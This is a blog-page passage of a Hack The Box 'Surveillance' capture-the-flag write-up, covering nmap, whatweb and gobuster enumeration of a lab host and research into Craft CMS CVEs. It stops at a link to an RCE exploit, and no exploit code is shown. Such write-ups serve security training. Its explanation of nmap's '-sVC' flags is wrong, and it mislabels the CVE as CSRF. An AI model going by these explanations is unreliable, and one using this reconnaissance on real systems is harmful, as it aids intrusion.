@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#1b1b1b">
+	<title>Surveillance | Dexter</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		
+  <meta itemprop="name" content="Surveillance">
+  <meta itemprop="description" content="Step by step methodology Nmap scan First of all we can do some basic enumeration like checking for open ports and this is made possible by using a tool called nmap, which is used for network discovery and security auditing. We are also going to pass some options to the command let us break it down first:
+-sVC: These are options passed to Nmap: -s: This option specifies the type of scan to perform. In this case, -s indicates that a TCP SYN scan is being performed. This scan technique sends SYN packets to the target ports and analyzes the responses to determine which ports are open. V: This option increases verbosity, providing more detailed information about the scan process and results. C: This option enables version detection. When version detection is enabled, Nmap attempts to determine the versions of the services running on the open ports by analyzing their responses. -T4: This option sets the timing template for the scan. Timing templates control the speed and aggressiveness of the scan. -T4 is a relatively aggressive timing template, indicating that the scan should be conducted at a fast pace, but not at the fastest possible speed (-T5). This helps to balance speed with reliability and accuracy. dexter@lab:~/lab/HTB/machines/surveilance$ sudo nmap -sVC -T4 10.10.11.245 -vv [sudo] password for dexter: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 02:01 EST NSE: Loaded 156 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:01 Completed NSE at 02:01, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:01 Completed NSE at 02:01, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:01 Completed NSE at 02:01, 0.00s elapsed Initiating Ping Scan at 02:01 Scanning 10.10.11.245 [4 ports] Completed Ping Scan at 02:01, 0.15s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 02:01 Completed Parallel DNS resolution of 1 host. at 02:01, 0.17s elapsed Initiating SYN Stealth Scan at 02:01 Scanning 10.10.11.245 [1000 ports] Discovered open port 80/tcp on 10.10.11.245 Discovered open port 22/tcp on 10.10.11.245 Increasing send delay for 10.10.11.245 from 0 to 5 due to 375 out of 937 dropped probes since last increase. Increasing send delay for 10.10.11.245 from 5 to 10 due to 11 out of 12 dropped probes since last increase. Completed SYN Stealth Scan at 02:01, 9.63s elapsed (1000 total ports) Initiating Service scan at 02:01 Scanning 2 services on 10.10.11.245 Completed Service scan at 02:01, 7.40s elapsed (2 services on 1 host) NSE: Script scanning 10.10.11.245. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:01 Completed NSE at 02:02, 6.45s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:02 Completed NSE at 02:02, 0.63s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:02 Completed NSE at 02:02, 0.01s elapsed Nmap scan report for 10.10.11.245 Host is up, received echo-reply ttl 63 (0.15s latency). Scanned at 2024-02-22 02:01:41 EST for 24s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN&#43;/g3FqMmVlkT3XCSMH/JtvGJDW3&#43;PBxqJ&#43;pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk= | 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN&#43;z3SVL/21fy6cZWZi 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://surveillance.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:02 Completed NSE at 02:02, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:02 Completed NSE at 02:02, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:02 Completed NSE at 02:02, 0.01s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.56 seconds Raw packets sent: 1643 (72.268KB) | Rcvd: 1023 (40.916KB) Running an Nmap scan I see that we have 2 ports open that is port 80 and port 22. Let us break that down:">
+  <meta itemprop="datePublished" content="2024-02-22T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-02-22T00:00:00+00:00">
+  <meta itemprop="wordCount" content="3548">
+  <meta itemprop="keywords" content="Privesc,Boot2root">
+	<link rel="stylesheet" href="/css/bundle.css">
+	<link rel="stylesheet" href="/custom.css">
+	<link rel="icon" href="/icons/16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="/icons/32.png" sizes="32x32" type="image/png">
+</head>
+<body class="body kind-page">
+	<header class="header">
+	<a class="logo" href="/">Dexter</a>
+	
+</header>
+	<div class="primary">
+	
+	<main class="main">
+		
+		<div class="single block">
+			<article class="entry">
+				<h1 class="entry__title">Surveillance</h1>
+<details class="entry__toc toc" open>
+	<summary class="toc__title">Table of Contents</summary>
+	<nav id="TableOfContents">
+  <ul>
+    <li><a href="#step-by-step-methodology">Step by step methodology</a></li>
+  </ul>
+</nav>
+</details>
+				<div class="entry__content"><h2 id="step-by-step-methodology">Step by step methodology</h2>
+<h1 id="nmap-scan">Nmap scan</h1>
+<p>First of all we can do some basic enumeration like checking for open ports and this is made possible by using a tool called nmap, which is used for network discovery and security auditing. We are also going to pass some options to the command let us break it down first:</p>
+<pre><code>-sVC: These are options passed to Nmap: 
+
+-s: This option specifies the type of scan to perform. In this case, -s indicates that a TCP SYN scan is being performed. This scan technique sends SYN packets to the target ports and analyzes the responses to determine which ports are open. 
+
+V: This option increases verbosity, providing more detailed information about the scan process and results. 
+
+C: This option enables version detection. When version detection is enabled, Nmap attempts to determine the versions of the services running on the open ports by analyzing their responses. 
+
+-T4: This option sets the timing template for the scan. Timing templates control the speed and aggressiveness of the scan. -T4 is a relatively aggressive timing template, indicating that the scan should be conducted at a fast pace, but not at the fastest possible speed (-T5). This helps to balance speed with reliability and accuracy. 
+</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/HTB/machines/surveilance$ sudo nmap -sVC -T4 10.10.11.245 -vv  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> dexter:  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-02-22 02:01 EST 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Loaded <span style="color:#ae81ff">156</span> scripts <span style="color:#66d9ef">for</span> scanning. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Script Pre-scanning. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating NSE at 02:01 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed NSE at 02:01, 0.00s elapsed 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating NSE at 02:01 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed NSE at 02:01, 0.00s elapsed 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating NSE at 02:01 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed NSE at 02:01, 0.00s elapsed 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating Ping Scan at 02:01 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.245 <span style="color:#f92672">[</span><span style="color:#ae81ff">4</span> ports<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed Ping Scan at 02:01, 0.15s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 02:01 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 02:01, 0.17s elapsed 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 02:01 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.245 <span style="color:#f92672">[</span><span style="color:#ae81ff">1000</span> ports<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.11.245 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.245 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.11.245 from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span> due to <span style="color:#ae81ff">375</span> out of <span style="color:#ae81ff">937</span> dropped probes since last increase. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.11.245 from <span style="color:#ae81ff">5</span> to <span style="color:#ae81ff">10</span> due to <span style="color:#ae81ff">11</span> out of <span style="color:#ae81ff">12</span> dropped probes since last increase. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 02:01, 9.63s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1000</span> total ports<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating Service scan at 02:01 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scanning <span style="color:#ae81ff">2</span> services on 10.10.11.245 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed Service scan at 02:01, 7.40s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> services on <span style="color:#ae81ff">1</span> host<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Script scanning 10.10.11.245. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating NSE at 02:01 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed NSE at 02:02, 6.45s elapsed 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating NSE at 02:02 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed NSE at 02:02, 0.63s elapsed 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating NSE at 02:02 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed NSE at 02:02, 0.01s elapsed 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.245 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scanned at 2024-02-22 02:01:41 EST <span style="color:#66d9ef">for</span> 24s 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON         VERSION 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk<span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">63</span> nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://surveillance.htb/ 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| http-methods:  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Script Post-scanning. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating NSE at 02:02 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed NSE at 02:02, 0.00s elapsed 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating NSE at 02:02 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed NSE at 02:02, 0.00s elapsed 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Initiating NSE at 02:02 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed NSE at 02:02, 0.01s elapsed 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 25.56 seconds 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">1643</span> <span style="color:#f92672">(</span>72.268KB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">1023</span> <span style="color:#f92672">(</span>40.916KB<span style="color:#f92672">)</span> 
+</span></span></code></pre></div><p>Running an Nmap scan I see that we have 2 ports open that is port 80 and port 22. Let us break that down:</p>
+<pre><code>Port 80: This is the default port for HTTP (Hypertext Transfer Protocol) traffic, which is used for serving web pages. If port 80 is open, it suggests that there is a web server running on your network that is accessible via the internet. Websites, web applications, and other web-based services typically use port 80 to communicate with clients. 
+
+Port 22: This is the default port for SSH (Secure Shell) traffic, which is used for secure remote access to a system. If port 22 is open, it indicates that there is a SSH server running on your network. SSH is commonly used by system administrators to remotely manage servers and devices securely over a network. 
+</code></pre>
+<p>Having both of these ports open can be typical for many servers or systems that require both web services and secure remote access.</p>
+<p>So next we can use a neat tool called whatweb, which is basically a web scanner tool used for identifying technologies used on websites. When you run WhatWeb on a target IP address or domain, it analyzes the web server&rsquo;s response and provides information about the technologies it detects, such as web frameworks, CMS (Content Management Systems), programming languages, and more. One can also opt to use wappalyzer which is a browser extension.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/HTB/machines/surveilance$ whatweb http://10.10.11.245/     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http://10.10.11.245/ <span style="color:#f92672">[</span><span style="color:#ae81ff">302</span> Found<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.11.245<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>http://surveillance.htb/<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span><span style="color:#ae81ff">302</span> Found<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span> 
+</span></span></code></pre></div><p>So visiting the site I see a bunch of things like it is powered by craft CMS and we also have an email link .</p>
+<p><code>demo@surveillance.htb</code></p>
+<p>Next step we can then try and check for hidden directories that may not be accessible through the normal browsing. Gobuster is a tool used for directory and file enumeration on web servers. It&rsquo;s particularly useful for discovering hidden or unlinked content that may not be easily accessible through normal browsing.</p>
+<p>When you run Gobuster against a target website or domain, it generates a list of potential directories and files by brute-forcing common directory and file names. It does this by sending HTTP requests to the web server and analyzing the server&rsquo;s responses to determine whether certain directories or files exist.</p>
+<p>Using 20 threads makes gobuster run a bit more faster.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/HTB/machines/surveilance$ gobuster dir -u http://surveillance.htb/ --wordlist /usr/share/dirb/wordlists/common.txt -t 20 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://surveillance.htb/ 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">20</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/dirb/wordlists/common.txt 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 304<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://surveillance.htb/admin/login<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://surveillance.htb/css/<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/fonts                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://surveillance.htb/fonts/<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://surveillance.htb/images/<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/img                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://surveillance.htb/img/<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/index                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 16230<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://surveillance.htb/js/<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/logout               <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://surveillance.htb/<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/web.config           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1202<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-admin             <span style="color:#f92672">(</span>Status: 418<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 24409<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">4614</span> / <span style="color:#ae81ff">4615</span> <span style="color:#f92672">(</span>99.98%<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Finished 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span> 
+</span></span></code></pre></div><p>We can read more on the status codes <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status">here</a></p>
+<p>So for example the code 302, The HyperText Transfer Protocol (HTTP) 302 Found redirect status response code indicates that the resource requested has been temporarily moved to the URL given by the Location header. A browser redirects to this page but search engines don&rsquo;t update their links.
+<img src="https://i.ibb.co/DYx599B/admin-page.png" alt="admin"></p>
+<p>Let us try a bunch of passwords. And they don&rsquo;t really work so time to go do some research that leads me here. So I tried playing around with burp suite and see what happens,  and it was not really that helpful since I couldn’t find anything, possibly a rabbit hole.
+<img src="https://i.ibb.co/2tsfd8f/burp-creds.png" alt="burp"></p>
+<p>So we can dig around articles such as: <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-37783">here</a> and <a href="https://cves.at/posts/cve-2022-37783/writeup/">here</a></p>
+<pre tabindex="0"><code> All Craft CMS versions between 3.0.0 and 3.7.32 disclose password hashes of users who authenticate using their E-Mail address or username in Anti-CSRF-Tokens. Craft CMS uses a cookie called CRAFT_CSRF_TOKEN and a HTML hidden field called CRAFT_CSRF_TOKEN to avoid Cross Site Request Forgery attacks. The CRAFT_CSRF_TOKEN cookie discloses the password hash in without encoding it whereas the corresponding HTML hidden field discloses the users&#39; password hash in a masked manner, which can be decoded by using public functions of the YII framework. 
+</code></pre><p>So we do see that some CMS versions are vulnerable to Cross site forgery request, so let us check our CMS version to see if this attack would be possible against our target. Going through index.php we find the version of the CMS. It is version 4.4.14 so we really cannot do a cross site forgery here.
+<img src="https://i.ibb.co/hZwbkXp/cms-version.png" alt="cms_version"></p>
+<p>Digging deeper we can find another nice article that mentions a vulnerability discovered that allowed attackers to perform arbirtiary code remotely.</p>
+<p><a href="https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226">exploit</a></p>
